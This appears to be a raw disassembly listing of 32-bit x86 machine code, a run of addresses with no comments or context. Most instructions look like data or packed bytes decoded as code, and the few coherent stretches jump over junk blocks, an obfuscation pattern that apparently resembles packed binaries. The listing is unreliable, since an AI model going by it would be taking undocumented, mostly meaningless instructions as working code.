  405563:	adc    esi,DWORD PTR [edi+esi*2]
  405566:	mov    esp,fs
  405568:	daa    
  405569:	mov    cs,WORD PTR [edx+ecx*2-0x307bf7c2]
  405570:	out    0x9d,al
  405572:	out    dx,al
  405573:	mov    ebx,ebp
  405575:	dec    ebp
  405576:	push   eax
  405577:	jns    0x4055ba
  405579:	arpl   WORD PTR [edi+0x61],bp
  40557c:	jo     0x40555b
  40557e:	cmp    DWORD PTR [eax-0x541b7756],edx
  405584:	jns    0x40556e
  405586:	fsub   DWORD PTR [ecx-0x6921d65a]
  40558c:	add    DWORD PTR [ebx+0x7fb6574b],eax
  405592:	sub    eax,0xe08282ce
  405597:	dec    DWORD PTR [edi+0x2b174baa]
  40559d:	inc    DWORD PTR [ebp+0x18]
  4055a0:	push   ss
  4055a1:	cwde   
  4055a2:	pop    eax
  4055a3:	mov    bh,0xbc
  4055a5:	jmp    0x4055cc
  4055a7:	push   0x3a0b4fa
  4055ac:	or     DWORD PTR [esi+0x75d06bf8],esi
  4055b2:	push   eax
  4055b3:	ins    DWORD PTR es:[edi],dx
  4055b4:	push   ebp
  4055b5:	mov    cl,0xcc
  4055b7:	inc    edi
  4055b8:	inc    esi
  4055b9:	lods   eax,DWORD PTR ds:[esi]
  4055ba:	out    dx,al
  4055bb:	xchg   DWORD PTR [edi+ebx*1-0x65aa44c4],edx
  4055c2:	fisttp QWORD PTR [edx+esi*2+0x2a9eec0f]
  4055c9:	inc    ebp
  4055ca:	and    BYTE PTR [ebx-0x4b],dh
  4055cd:	lods   eax,DWORD PTR ds:[esi]
  4055ce:	leave  
  4055cf:	dec    edi
  4055d0:	jo     0x4055fe
  4055d2:	aas    
  4055d3:	add    al,0x2b
  4055d5:	or     eax,DWORD PTR [esi-0x1e]
  4055d8:	dec    eax
  4055d9:	mov    WORD PTR [edx-0x72b3eb3],?
  4055df:	test   DWORD PTR [ebx-0x66],ecx
  4055e2:	stos   DWORD PTR es:[edi],eax
  4055e3:	xor    cl,BYTE PTR [esi]
  4055e5:	jb     0x405619
  4055e7:	cmp    al,0xa
  4055e9:	mov    WORD PTR [ebp+0x27],ss
  4055ec:	out    dx,al
  4055ed:	cs cmc 
  4055ef:	nop
  4055f0:	stc    
  4055f1:	ret    
  4055f2:	out    0x2,al
  4055f4:	fimul  DWORD PTR [eax+0x22508a64]
  4055fa:	sbb    DWORD PTR [ecx-0x41],ecx
  4055fd:	cmp    esi,DWORD PTR ds:0x7649b782
  405603:	and    al,0xaa
  405605:	pop    ebp
  405606:	pop    ebx
  405607:	dec    esp
  405608:	out    0x0,al
  40560a:	inc    ebp
  40560b:	dec    esi
  40560c:	mov    edi,0xa033049a
  405611:	cli    
  405612:	jno    0x40559b
  405614:	in     al,dx
  405615:	or     dh,BYTE PTR [ebx]
  405617:	pop    es
  405618:	sbb    eax,0x3d6e2949
  40561d:	aas    
  40561e:	mov    al,ds:0xb0f9ca00
  405623:	adc    esi,DWORD PTR es:[ecx+0x6c378e84]
  40562a:	add    al,0xca
  40562c:	pop    ecx
  40562d:	nop
  40562e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40562f:	jbe    0x405612
  405631:	dec    ebp
  405632:	pop    eax
  405633:	fnsave [edx-0x35]
  405636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405637:	test   al,0x11
  405639:	fstp   DWORD PTR [edx-0x3c]
  40563c:	clc    
  40563d:	test   DWORD PTR [ecx+eiz*8+0xa],edi
  405641:	aad    0x9e
  405643:	sbb    dl,BYTE PTR [edx]
  405645:	mov    al,ds:0x51855669
  40564a:	mov    ebp,0x9d8a6079
  40564f:	mov    dl,0x67
  405651:	mov    esp,0xa1bda6d2
  405656:	out    dx,al
  405657:	(bad)  
  405658:	xchg   ebp,eax
  405659:	mov    eax,edx
  40565b:	mov    bl,ch
  40565d:	jmp    0x4f3:0x481e6bb
  405664:	xor    eax,0x2f4c3c56
  405669:	lea    esp,[edi-0x11c276a7]
  40566f:	and    al,0xcb
  405671:	push   esi
  405672:	push   cs
  405673:	xchg   DWORD PTR [edi-0x31],ebx
  405676:	test   al,0xd0
  405678:	mov    bh,0x37
  40567a:	cmp    al,0xbb
  40567c:	in     eax,0xa5
  40567e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40567f:	sub    BYTE PTR [ebx],0x98
  405682:	rol    BYTE PTR [edx+0x1f3e6374],0xa1
  405689:	aad    0x11
  40568b:	pop    esi
  40568c:	pop    di
  40568e:	mov    cl,0x4f
  405690:	inc    ecx
  405691:	ss into 
  405693:	add    al,0x81
  405695:	sbb    BYTE PTR [ecx],dl
  405697:	stos   DWORD PTR es:[edi],eax
  405698:	out    dx,eax
  405699:	push   esp
  40569a:	mov    esp,0xd5e30805
  40569f:	ins    DWORD PTR es:[edi],dx
  4056a0:	pop    es
  4056a1:	pop    es
  4056a2:	int3   
  4056a3:	mov    gs,edx
  4056a5:	cmc    
  4056a6:	adc    BYTE PTR [edx],dh
  4056a8:	in     eax,dx
  4056a9:	mov    fs,edi
  4056ab:	add    edx,DWORD PTR [ebx-0x3b]
  4056ae:	fld    TBYTE PTR [ebx+0x36]
  4056b1:	clc    
  4056b2:	dec    edi
  4056b3:	cmc    
  4056b4:	mov    ch,0xec
  4056b6:	jp     0x4056bb
  4056b8:	push   esp
  4056b9:	mov    al,ds:0x9fc27f23
  4056be:	mov    BYTE PTR [eax],0xe2
  4056c1:	mov    dh,0x8e
  4056c3:	pop    es
  4056c4:	bound  ecx,QWORD PTR [esi+0x40bc2904]
  4056ca:	pop    DWORD PTR [edx]
  4056cc:	scas   eax,DWORD PTR es:[edi]
  4056cd:	mov    ch,0x43
  4056cf:	fistp  QWORD PTR [ecx+ebp*1-0x1a300bef]
  4056d6:	out    0x19,eax
  4056d8:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056da:	lds    ecx,FWORD PTR [ebx+0x26ce38c2]
  4056e0:	pushf  
  4056e1:	ja     0x4056ee
  4056e3:	jo     0x4056ff
  4056e5:	jecxz  0x4056fb
  4056e7:	pop    ebp
  4056e8:	gs mov bl,cl
  4056eb:	out    0xc5,eax
  4056ed:	add    al,0xe2
  4056ef:	dec    edx
  4056f0:	into   
  4056f1:	add    al,0xf4
  4056f3:	test   al,0xbe
  4056f5:	popf   
  4056f6:	retf   0xe16f
  4056f9:	lock loopne 0x405713
  4056fc:	scas   eax,DWORD PTR es:[edi]
  4056fd:	dec    esp
  4056fe:	mov    WORD PTR [edx+edi*4],fs
  405701:	dec    esp
  405702:	add    al,BYTE PTR [ebp+0x54]
  405705:	scas   al,BYTE PTR es:[edi]
  405706:	mov    esi,0x12e68c8c
  40570b:	pop    edx
  40570c:	popf   
  40570d:	push   edx
  40570e:	or     eax,0x2077b31e
  405713:	mov    ds:0x223cb0b3,al
  405718:	lods   eax,DWORD PTR es:[esi]
  40571a:	or     BYTE PTR [ebp-0x79],0x7a
  40571e:	sbb    al,0x71
  405720:	lods   eax,DWORD PTR ds:[esi]
  405721:	sahf   
  405722:	test   eax,0xa7be2fc2
  405727:	xor    eax,0x4fc931bd
  40572c:	and    eax,eax
  40572e:	loope  0x40572b
  405730:	dec    ebp
  405731:	sub    ebp,edi
  405733:	(bad)  
  405734:	sbb    cl,BYTE PTR [ebx]
  405736:	sub    eax,0xbb4f86f5
  40573b:	sub    al,0xe
  40573d:	clc    
  40573e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40573f:	mov    bl,0xb6
  405741:	mov    cl,0x7e
  405743:	int    0x83
  405745:	sahf   
  405746:	fld    QWORD PTR [ebp+0x33]
  405749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40574a:	jae    0x4057ac
  40574c:	addr16 (bad) 
  40574e:	mov    esp,0xbe2d2a8e
  405753:	mov    ds:0xa36bad94,eax
  405758:	add    eax,0xa6108887
  40575d:	loope  0x4056e5
  40575f:	icebp  
  405760:	imul   ebx,edx,0x31e6c852
  405766:	jb     0x40575d
  405768:	cs aaa 
  40576a:	xchg   esp,eax
  40576b:	xlat   BYTE PTR ds:[ebx]
  40576c:	mov    dh,0x67
  40576e:	retf   0xb058
  405771:	push   ebx
  405772:	mov    eax,ds:0x2a3be5b9
  405777:	push   es
  405778:	push   edx
  405779:	icebp  
  40577a:	test   al,0x66
  40577c:	dec    edi
  40577d:	mov    fs,esp
  40577f:	push   DWORD PTR [eax-0x35458195]
  405785:	seta   dl
  405788:	into   
  405789:	nop
  40578a:	jo     0x40573a
  40578c:	hlt    
  40578d:	ja     0x4057be
  40578f:	leave  
  405790:	push   0x65
  405792:	mov    esp,0xdc7af4e
  405797:	ret    0x7bd1
  40579a:	jle    0x405819
  40579c:	jne    0x405724
  40579e:	ficomp DWORD PTR [ebx+0x5a]
  4057a1:	aad    0xcb
  4057a3:	sub    eax,0xd38517a7
  4057a8:	stc    
  4057a9:	mov    ecx,0xa9f3f57b
  4057ae:	fs out 0xcc,al
  4057b1:	outs   dx,BYTE PTR ds:[esi]
  4057b2:	push   edx
  4057b3:	popa   
  4057b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057b5:	inc    edx
  4057b6:	mov    ebx,0xe77205bb
  4057bb:	lods   al,BYTE PTR ds:[esi]
  4057bc:	jp     0x4057bc
  4057be:	push   esi
  4057bf:	pop    esi
  4057c0:	push   ds
  4057c1:	cmp    al,0x72
  4057c3:	inc    ebx
  4057c4:	outs   dx,BYTE PTR ds:[esi]
  4057c5:	sbb    eax,0x2ce1209
  4057ca:	adc    eax,0x6d546175
  4057cf:	cmp    DWORD PTR [eax],edi
  4057d1:	loope  0x405802
  4057d3:	popf   
  4057d4:	imul   DWORD PTR [edx+0x2c03e4bc]
  4057da:	int    0x6c
  4057dc:	push   es
  4057dd:	(bad)  [esi]
  4057df:	mov    DWORD PTR [esi],esp
  4057e1:	jl     0x405800
  4057e3:	mov    al,ds:0x8ec30ddf
  4057e8:	je     0x40584f
  4057ea:	test   BYTE PTR [ecx+0x65ed5a35],ch
  4057f0:	cdq    
  4057f1:	sti    
  4057f2:	repnz sbb DWORD PTR [ebp+0x35],0x3a
  4057f7:	cmp    BYTE PTR [ebx+0x5f],bh
  4057fa:	sar    DWORD PTR [ebp-0x9],1
  4057fd:	repnz inc ecx
  4057ff:	pushf  
  405800:	xor    DWORD PTR [edx+0x7e],0xa8e3fbf3
  405807:	shl    BYTE PTR [ecx],1
  405809:	xchg   esi,eax
  40580a:	(bad)  
  40580c:	(bad)
  40580f:	cwde   
  405810:	int    0x47
  405812:	outs   dx,DWORD PTR ds:[esi]
  405813:	push   es
  405814:	ficomp DWORD PTR [edx+eiz*4]
  405817:	push   esp
  405818:	loopne 0x4057c0
  40581a:	xchg   ecx,eax
  40581b:	pop    ds
  40581c:	push   edi
  40581d:	loop   0x40582c
  40581f:	sub    dh,BYTE PTR [ebx]
  405821:	out    0x75,al
  405823:	add    al,0xcc
  405825:	out    0x42,al
  405827:	leave  
  405828:	mov    ebp,0xc5522736
  40582d:	pop    edi
  40582e:	xchg   edi,eax
  40582f:	jg     0x405864
  405831:	daa    
  405832:	mov    al,0xf5
  405834:	sub    DWORD PTR [edx],ebp
  405836:	push   esp
  405837:	or     ebx,esi
  405839:	push   es
  40583a:	mov    edx,DWORD PTR [esi+0x4]
  40583d:	neg    DWORD PTR ds:0x42836b
  405843:	mov    DWORD PTR [ebp-0x2c],ecx
  405846:	cmp    DWORD PTR ds:0x428157,0x0
  40584d:	mov    DWORD PTR ds:0x428247,0x540
  405857:	mov    ecx,0x427
  40585c:	mov    edx,0x7aa7
  405861:	jmp    0x4058af
  405866:	mov    ecx,0x6abc
  40586b:	mov    DWORD PTR ds:0x428247,0x2ac5
  405875:	cmp    DWORD PTR ds:0x428157,0x0
  40587c:	jb     0x40589d
  405882:	push   0x1050
  405887:	call   DWORD PTR ds:0x428e54
  40588d:	adc    DWORD PTR ds:0x4282eb,edx
  405893:	or     DWORD PTR ds:0x42821b,0x369f
  40589d:	neg    DWORD PTR ds:0x42815b
  4058a3:	sub    DWORD PTR ds:0x42813b,edi
  4058a9:	sub    edx,0xfd0
  4058af:	mov    ecx,DWORD PTR [ebp+0x18]
  4058b2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058b5:	shrd   ecx,edx,0x2
  4058b9:	shr    edx,0x2
  4058bc:	mov    DWORD PTR [ebp-0x1c],ecx
  4058bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4058c2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058c5:	xor    DWORD PTR [ebp-0x1c],edi
  4058c8:	xor    edx,edx
  4058ca:	or     edx,DWORD PTR [ebp-0x1c]
  4058cd:	shl    ecx,0x1e
  4058d0:	add    edx,DWORD PTR [ebp-0x2c]
  4058d3:	add    DWORD PTR [eax],edx
  4058d5:	mov    eax,DWORD PTR [esi]
  4058d7:	mov    ecx,DWORD PTR [esi+0x4]
  4058da:	shrd   eax,ecx,0x2
  4058de:	shr    ecx,0x2
  4058e1:	mov    ecx,DWORD PTR [esi]
  4058e3:	mov    edx,DWORD PTR [esi+0x4]
  4058e6:	xor    eax,edi
  4058e8:	shl    ecx,0x1e
  4058eb:	xor    edx,edx
  4058ed:	or     edx,eax
  4058ef:	mov    DWORD PTR [ebp-0x4],edx
  4058f2:	mov    DWORD PTR [ebp-0x30],0xca79a575
  4058f9:	mov    eax,0x9c1b89e8
  4058fe:	jmp    0x405cdc
  405903:	ret    
  405904:	scas   eax,DWORD PTR es:[edi]
  405905:	sar    ebx,0x9d
  405908:	fcmovb st,st(2)
  40590a:	scas   al,BYTE PTR es:[edi]
  40590b:	mov    dl,0xbd
  40590d:	(bad)  
  40590e:	jl     0x4058a3
  405910:	xor    al,0x6d
  405912:	mov    al,0x6d
  405914:	mov    cl,0x18
  405916:	sbb    BYTE PTR [esi-0x27e7e7ee],bl
  40591c:	imul   ebx,DWORD PTR [edi+0x2f],0xfffffff3
  405920:	jns    0x4058ac
  405922:	push   es
  405923:	jmp    0xec16f11a
  405928:	std    
  405929:	les    esp,FWORD PTR [eax-0x65357910]
  40592f:	ret    
  405930:	ja     0x4059b1
  405932:	sar    DWORD PTR [esi],0x43
  405935:	xchg   edx,eax
  405936:	call   0xa3bd4fbb
  40593b:	jp     0x4059bc
  40593d:	sar    DWORD PTR [esp+esi*8+0x32e0eb8],1
  405944:	sub    cl,BYTE PTR [ecx-0x40]
  405947:	xor    esi,ecx
  405949:	or     BYTE PTR [esi],ah
  40594b:	dec    esp
  40594c:	xchg   edi,eax
  40594d:	loop   0x405984
  40594f:	xor    al,BYTE PTR [esi-0x7d]
  405952:	dec    esp
  405953:	mov    ds:0xbadbde9a,eax
  405958:	imul   esi,DWORD PTR [eax+0x3eed2a9f],0x9e391913
  405962:	in     al,0xf9
  405964:	scas   al,BYTE PTR es:[edi]
  405965:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405966:	or     dh,ch
  405968:	mov    fs,WORD PTR [eax]
  40596a:	pop    esi
  40596b:	cmc    
  40596c:	push   ds
  40596d:	or     al,0xb9
  40596f:	jle    0x405908
  405971:	or     eax,0x3f9c6176
  405976:	(bad)  
  405977:	sub    bh,al
  405979:	test   al,0x88
  40597b:	scas   eax,DWORD PTR es:[edi]
  40597c:	inc    ecx
  40597d:	test   cl,bh
  40597f:	out    dx,al
  405980:	sbb    eax,0xa64ade90
  405985:	inc    edx
  405986:	clc    
  405987:	fld    TBYTE PTR [ebx-0x7e]
  40598a:	test   al,0x33
  40598c:	pop    ebx
  40598d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40598e:	sub    BYTE PTR [edi+ecx*8+0x62961af],cl
  405995:	neg    BYTE PTR ds:0xaea44797
  40599b:	or     esi,DWORD PTR ds:0xdfcbaa17
  4059a1:	leave  
  4059a2:	imul   edx,DWORD PTR [edx-0x36],0xb30265a7
  4059a9:	sub    bl,BYTE PTR [edi+ebx*1+0x63f5092f]
  4059b0:	mov    ch,0x93
  4059b2:	cmp    DWORD PTR [edi+eax*1-0x3b],ebp
  4059b6:	mov    cl,0xc7
  4059b8:	jo     0x405a0b
  4059ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059bb:	aam    0x4d
  4059bd:	aad    0x4d
  4059bf:	sbb    BYTE PTR [ecx-0x26967cb4],0x9f
  4059c6:	mov    edx,0xa8d14307
  4059cb:	mov    ds:0xd4d7dfdf,eax
  4059d0:	fdiv   QWORD PTR [eax]
  4059d2:	std    
  4059d3:	mov    ecx,0xe81d7c02
  4059d8:	mov    al,BYTE PTR [esi-0x430d150a]
  4059de:	std    
  4059df:	(bad)  
  4059e0:	rcl    DWORD PTR ds:0x3b21e851,cl
  4059e6:	out    dx,eax
  4059e7:	mov    esi,0x3565ec5a
  4059ec:	test   BYTE PTR [ecx+0x27],bl
  4059ef:	daa    
  4059f0:	adc    eax,0xd6071df8
  4059f5:	dec    esi
  4059f6:	call   0x6a9b:0xc9b5d56f
  4059fd:	inc    ebx
  4059fe:	mov    eax,ds:0xfe35a767
  405a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a04:	mov    eax,ds:0x6d935a40
  405a09:	dec    esp
  405a0a:	int    0x48
  405a0c:	push   cs
  405a0d:	and    ecx,DWORD PTR [edi-0x55]
  405a10:	popf   
  405a11:	aas    
  405a12:	sbb    al,BYTE PTR [ebp-0x63]
  405a15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a16:	or     BYTE PTR gs:[edx+0x10],cl
  405a1a:	mov    eax,0xbb6ccbb8
  405a1f:	(bad)  
  405a20:	neg    ecx
  405a22:	jnp    0x405a1f
  405a24:	pop    es
  405a25:	ds stos DWORD PTR es:[edi],eax
  405a27:	(bad)  
  405a28:	mov    WORD PTR [ebx-0x37f50b41],gs
  405a2e:	gs or  eax,0x1c56829d
  405a34:	aas    
  405a35:	out    dx,eax
  405a36:	in     al,0x17
  405a38:	cmp    esp,esp
  405a3a:	arpl   WORD PTR [ebx],bp
  405a3c:	push   esi
  405a3d:	pop    edi
  405a3e:	mov    edx,DWORD PTR [ecx]
  405a40:	xor    edi,DWORD PTR [eax+0x7725bb96]
  405a46:	lea    edx,[edx+0x45]
  405a49:	jp     0x405a5b
  405a4b:	push   ebx
  405a4c:	out    0xd1,al
  405a4e:	jno    0x405a30
  405a50:	jns    0x4059d7
  405a52:	xchg   esi,eax
  405a53:	dec    esi
  405a54:	aaa    
  405a55:	or     BYTE PTR [ebx-0x1f6893da],0x9d
  405a5c:	outs   dx,BYTE PTR ds:[esi]
  405a5d:	mov    bh,0x6b
  405a5f:	loope  0x405a21
  405a61:	xchg   esp,eax
  405a62:	mov    esi,0x1d99deb1
  405a67:	and    eax,0x59
  405a6a:	leave  
  405a6b:	inc    ebp
  405a6c:	enter  0x6f19,0x20
  405a70:	pop    ss
  405a71:	pop    ebx
  405a72:	inc    ebx
  405a73:	mov    bl,0x57
  405a75:	jge    0x405ad6
  405a77:	cli    
  405a78:	and    esp,ebp
  405a7a:	arpl   di,di
  405a7c:	dec    ecx
  405a7d:	cmp    eax,0x4808dfca
  405a82:	inc    ebx
  405a83:	jmp    0x405a8d
  405a85:	push   edi
  405a86:	outs   dx,DWORD PTR ds:[esi]
  405a87:	in     al,dx
  405a88:	and    al,0x4a
  405a8a:	idiv   dh
  405a8c:	rol    DWORD PTR ds:0x20f8105e,0xcc
  405a93:	cdq    
  405a94:	ins    DWORD PTR es:[edi],dx
  405a95:	inc    ebp
  405a96:	jnp    0x405a4a
  405a98:	data16 jge 0x405a6e
  405a9b:	inc    eax
  405a9c:	pop    eax
  405a9d:	hlt    
  405a9e:	xchg   edi,eax
  405a9f:	pop    edx
  405aa0:	pusha  
  405aa1:	mov    al,0x6f
  405aa3:	pop    ds
  405aa4:	xor    BYTE PTR [esi],dl
  405aa6:	gs dec edi
  405aa8:	inc    edx
  405aa9:	test   DWORD PTR ds:0x9535a4c8,esp
  405aaf:	ror    DWORD PTR [ebx-0x33],0x49
  405ab3:	mov    al,0x82
  405ab5:	lods   al,BYTE PTR ds:[esi]
  405ab6:	mov    edi,0x4ad73d9e
  405abb:	cdq    
  405abc:	mov    gs,WORD PTR [ecx+ebp*2+0x45]
  405ac0:	pop    esi
  405ac1:	call   0x8114:0x8e66fd7a
  405ac8:	xor    ebp,DWORD PTR [edi]
  405aca:	add    bl,bh
  405acc:	or     eax,0x401c7572
  405ad1:	lea    esp,[esi+0x60a54c7f]
  405ad7:	mov    bl,0xdc
  405ad9:	daa    
  405ada:	sub    eax,0xd15356ef
  405adf:	dec    eax
  405ae0:	imul   BYTE PTR [ebx-0x7e2fad36]
  405ae6:	adc    al,0xce
  405ae8:	pop    es
  405ae9:	ja     0x405af9
  405aeb:	gs shr dl,0xb6
  405aef:	je     0x405ab7
  405af1:	sub    bl,bl
  405af3:	xchg   esi,eax
  405af4:	adc    dl,BYTE PTR [eax]
  405af6:	pop    edx
  405af7:	cmp    BYTE PTR [edi-0x348a76fe],dl
  405afd:	inc    ecx
  405afe:	dec    esi
  405aff:	scas   al,BYTE PTR es:[edi]
  405b00:	mov    ecx,0xfeb773b3
  405b05:	mov    al,ds:0x378b6e77
  405b0a:	rcl    DWORD PTR [ebp+0x627c8da8],1
  405b10:	mov    edi,0x4be2e370
  405b15:	add    eax,0xfb5c6185
  405b1a:	push   ss
  405b1b:	xchg   esi,eax
  405b1c:	xchg   BYTE PTR [ecx+0x68],bl
  405b1f:	add    dh,BYTE PTR [ecx-0x7e6fbd1a]
  405b25:	sbb    eax,0x702e4728
  405b2a:	pop    eax
  405b2b:	adc    eax,0x18c12fc6
  405b30:	ds pop ss
  405b32:	cmp    al,0x59
  405b34:	or     edi,DWORD PTR [ebx*8-0x1164a9fd]
  405b3b:	cmp    edx,DWORD PTR [eax+eax*2-0x3f]
  405b3f:	pop    esp
  405b40:	xchg   esp,eax
  405b41:	mov    DWORD PTR [esi+0x6d5b776],esp
  405b47:	or     eax,0x3ecfb791
  405b4c:	dec    esp
  405b4d:	cdq    
  405b4e:	mov    DWORD PTR [edx+0xc],ebp
  405b51:	push   0x25
  405b53:	in     al,0xfa
  405b55:	fst    DWORD PTR [edx+ebp*1+0x1b]
  405b59:	adc    DWORD PTR [eax+0x52a0d20c],0x296bf896
  405b63:	jecxz  0x405b6e
  405b65:	mov    BYTE PTR [ecx+ecx*2+0x2f],dh
  405b69:	fdivr  QWORD PTR [esi]
  405b6b:	bound  ebp,QWORD PTR [ecx+ebx*8]
  405b6e:	mov    al,0x1f
  405b70:	gs push ecx
  405b72:	dec    edx
  405b73:	stos   BYTE PTR es:[edi],al
  405b74:	test   BYTE PTR [ecx-0x6],ch
  405b77:	mov    ch,0x56
  405b79:	pop    esi
  405b7a:	add    dl,BYTE PTR [edx]
  405b7c:	les    edi,FWORD PTR [esi]
  405b7e:	fiadd  WORD PTR [ebp-0x68]
  405b81:	ins    BYTE PTR es:[edi],dx
  405b82:	sbb    BYTE PTR [edi+0x6e04a9f],ch
  405b88:	(bad)  
  405b89:	push   ebp
  405b8a:	xchg   ebx,eax
  405b8b:	mov    eax,0x31ad4798
  405b90:	int3   
  405b91:	pop    ecx
  405b92:	stc    
  405b93:	adc    eax,0xddb0efb8
  405b98:	ror    DWORD PTR [ebx+0x5b448209],cl
  405b9e:	aad    0x73
  405ba0:	in     al,0x1d
  405ba2:	ja     0x405b9b
  405ba4:	mov    DWORD PTR [esi],esp
  405ba6:	lock (bad) [eax+0x6d45b08f]
  405bad:	mov    eax,0xfbc1ab08
  405bb2:	xor    edi,esp
  405bb4:	stos   DWORD PTR es:[edi],eax
  405bb5:	xchg   esp,eax
  405bb6:	sbb    esp,DWORD PTR [ebp-0x5d]
  405bb9:	mov    ecx,0x59189e60
  405bbe:	lahf   
  405bbf:	inc    edx
  405bc0:	adc    eax,DWORD PTR [ebx-0x6777406e]
  405bc6:	int    0x23
  405bc8:	pop    edx
  405bc9:	rcr    DWORD PTR [edi+0x11518dfc],0x7
  405bd0:	mov    edx,0xe391b3c9
  405bd5:	pop    edi
  405bd6:	jecxz  0x405bab
  405bd8:	mov    esi,0x2ae47f40
  405bdd:	pop    es
  405bde:	cmp    al,0x28
  405be0:	and    al,BYTE PTR [ebx]
  405be2:	stos   DWORD PTR es:[edi],eax
  405be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405be4:	aaa    
  405be5:	loope  0x405c38
  405be7:	dec    ebx
  405be8:	popa   
  405be9:	(bad)  
  405beb:	(bad)  
  405bec:	lods   eax,DWORD PTR ds:[esi]
  405bed:	pop    edi
  405bee:	or     ebx,DWORD PTR [ebx]
  405bf0:	je     0x405c14
  405bf2:	mov    ah,0x4f
  405bf4:	(bad)  
  405bf5:	out    0x89,eax
  405bf7:	sahf   
  405bf8:	mov    ebx,0x505a7e55
  405bfd:	mov    DWORD PTR [eax+0x0],eax
  405c00:	cmp    eax,0xa5beab40
  405c05:	lahf   
  405c06:	(bad)  
  405c07:	hlt    
  405c08:	stc    
  405c09:	xor    cl,BYTE PTR [ebp-0x14]
  405c0c:	cld    
  405c0d:	lods   eax,DWORD PTR ds:[esi]
  405c0e:	pop    edi
  405c0f:	int    0xd1
  405c11:	cmp    BYTE PTR [edi-0x32],al
  405c14:	mov    esi,0x7fa2049a
  405c19:	popf   
  405c1a:	or     eax,0x40c558ac
  405c1f:	sub    eax,0xa1dd8434
  405c24:	jmp    0x405c0d
  405c26:	data16 rcl BYTE PTR [eax],0xd9
  405c2a:	(bad)
  405c2d:	cmp    al,0x7d
  405c2f:	xor    al,dl
  405c31:	or     al,0x7a
  405c34:	push   edx
  405c35:	mov    dl,0xfd
  405c37:	xchg   BYTE PTR [ebx+ecx*8-0x31],bh
  405c3b:	xchg   BYTE PTR [ecx+0x24],dh
  405c3e:	push   esp
  405c3f:	bound  esp,QWORD PTR [eax+0x20e90881]
  405c45:	ins    DWORD PTR es:[edi],dx
  405c46:	mov    eax,ds:0x82b9670f
  405c4b:	mov    dl,cl
  405c4d:	ror    ecx,1
  405c4f:	int3   
  405c50:	mov    esi,0x63483334
  405c55:	into   
  405c56:	pop    eax
  405c57:	rcr    edi,1
  405c59:	xor    DWORD PTR ds:0x19fae5c7,0xffffffdc
  405c60:	mov    esi,0xdba7b0a9
  405c65:	lahf   
  405c66:	and    esi,DWORD PTR [edi+0x46]
  405c69:	adc    al,bh
  405c6b:	add    eax,0xdbb3157e
  405c70:	stos   BYTE PTR es:[edi],al
  405c71:	jnp    0x405c2e
  405c73:	cmp    eax,edx
  405c75:	jo     0x405c48
  405c77:	inc    edi
  405c78:	inc    ebp
  405c79:	rol    DWORD PTR [edx],0x83
  405c7c:	sti    
  405c7d:	add    edi,DWORD PTR [edx-0x3c6c613b]
  405c83:	jmp    0xda1c:0xa8f86a13
  405c8a:	data16 ins BYTE PTR es:[edi],dx
  405c8c:	mov    DWORD PTR [edx+ebx*1+0x36],esi
  405c90:	mov    cl,0x98
  405c92:	test   eax,0xc3de5e20
  405c97:	jbe    0x405c47
  405c99:	xor    esi,esp
  405c9b:	mov    ebx,0x122cfff9
  405ca0:	push   ss
  405ca1:	leave  
  405ca2:	sbb    al,0xad
  405ca4:	ror    BYTE PTR cs:[edi+0x4e7f1362],0xc3
  405cac:	cmc    
  405cad:	ret    0x5b0b
  405cb0:	dec    eax
  405cb1:	iret   
  405cb2:	mov    dl,0x13
  405cb4:	xchg   esp,eax
  405cb5:	add    eax,0xf8850e33
  405cba:	stc    
  405cbb:	cmp    DWORD PTR [ecx],esp
  405cbd:	(bad)  
  405cbe:	lods   eax,DWORD PTR ds:[esi]
  405cbf:	aad    0x9f
  405cc1:	sar    bl,cl
  405cc3:	retf   
  405cc4:	inc    esp
  405cc5:	cdq    
  405cc6:	dec    edx
  405cc7:	mov    ah,0x96
  405cc9:	dec    eax
  405cca:	jnp    0x405cf5
  405ccc:	rol    BYTE PTR [esi],0xca
  405ccf:	jns    0x405d31
  405cd1:	bound  edx,QWORD PTR [edx+0x5f]
  405cd4:	xor    ch,BYTE PTR [edi]
  405cd6:	or     ch,bh
  405cd8:	jl     0x405d27
  405cda:	mov    bh,0x55
  405cdc:	mov    DWORD PTR [ebp-0x2c],eax
  405cdf:	mov    DWORD PTR [ebp-0x20],0xca79a571
  405ce6:	mov    DWORD PTR [ebp-0x1c],eax
  405ce9:	mov    DWORD PTR [ebp-0x10],0xca79a57d
  405cf0:	mov    DWORD PTR [ebp-0xc],eax
  405cf3:	mov    DWORD PTR [ebp-0x60],0xca79a579
  405cfa:	mov    DWORD PTR [ebp-0x5c],eax
  405cfd:	mov    eax,DWORD PTR [ebp-0x30]
  405d00:	mov    ecx,DWORD PTR [ebp-0x2c]
  405d03:	shrd   eax,ecx,0x2
  405d07:	shr    ecx,0x2
  405d0a:	mov    ecx,DWORD PTR [ebp-0x30]
  405d0d:	mov    edx,DWORD PTR [ebp-0x2c]
  405d10:	xor    eax,edi
  405d12:	shl    ecx,0x1e
  405d15:	xor    edx,edx
  405d17:	or     eax,edx
  405d19:	jmp    0x4060f7
  405d1e:	cmp    ebp,DWORD PTR [ecx+0x3e]
  405d21:	lock sbb ch,BYTE PTR [esi+0x62d8231a]
  405d28:	shl    DWORD PTR [eax+0x0],1
  405d2b:	popf   
  405d2c:	iret   
  405d2d:	jo     0x405d21
  405d2f:	test   eax,0x129e1818
  405d34:	sbb    BYTE PTR [eax],bl
  405d36:	fimul  WORD PTR [ebp-0xb]
  405d39:	xor    BYTE PTR [esi+0x10212407],ah
  405d3f:	jg     0xb72852f3
  405d45:	inc    edx
  405d46:	sub    al,0x1c
  405d48:	into   
  405d49:	mov    esp,DWORD PTR [edx]
